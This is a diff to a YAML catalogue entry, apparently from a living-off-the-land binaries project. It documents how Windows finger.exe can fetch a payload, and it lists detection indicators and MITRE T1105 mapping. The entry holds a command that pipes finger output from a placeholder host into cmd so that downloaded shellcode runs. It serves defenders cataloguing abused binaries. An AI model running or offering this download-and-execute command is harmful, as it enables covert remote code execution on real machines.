@@ -5,26 +5,27 @@ Author: Ruben Revuelta
 Created: 2021-08-30
 Commands:
   - Command: finger user@example.host.com | more +2 | cmd
-    Description: Connects to "example.host.com" domain asking for the fake user "user" downloading as a result a malicious shellcode which is executed by cmd process.
-    Usecase: Download malicious shellcode from Command & Control server.
+    Description: 'Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.'
+    Usecase: Download malicious payload
     Category: Download
     Privileges: User
     MitreID: T1105
     MitreLink: https://attack.mitre.org/techniques/T1105
-    OperatingSystem: From Windows Server 2008 and Windows 8
+    OperatingSystem: Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022
 Full_Path:
   - Path: c:\windows\system32\finger.exe
   - Path: c:\windows\syswow64\finger.exe
-Code_Sample: 
-  - Code:
 Detection: 
-  - IOC: finger.exe spawn is not common in client systems.
+  - IOC: finger.exe should not be run on a normal workstation.
   - IOC: finger.exe connecting to external resources.
 Resources:
+  - Link: https://twitter.com/DissectMalware/status/997340270273409024
   - Link: https://docs.microsoft.com/es-es/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)
 Acknowledgement:
   - Person: Ruben Revuelta (MAPFRE CERT)
-    Handle: @rubn_RB
+    Handle: '@rubn_RB'
   - Person: Jose A. Jimenez (MAPFRE CERT)
-    Handle: @Ocelotty6669
+    Handle: '@Ocelotty6669'
+  - Person: Malwrologist
+    Handle: '@DissectMalware'
 ---
